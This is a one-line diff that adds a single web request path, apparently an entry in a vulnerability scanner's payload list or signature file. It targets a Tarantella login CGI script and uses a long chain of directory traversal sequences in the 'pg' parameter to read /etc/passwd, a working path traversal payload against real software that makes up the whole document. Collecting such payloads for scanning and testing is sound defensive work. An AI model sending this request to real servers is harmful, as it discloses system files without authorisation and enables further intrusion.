@@ -1,0 +1,1 @@
+/tarantella/cgi-bin/secure/ttawlogin.cgi/?action=start&pg=../../../../../../../../../../../../../../../etc/passwd
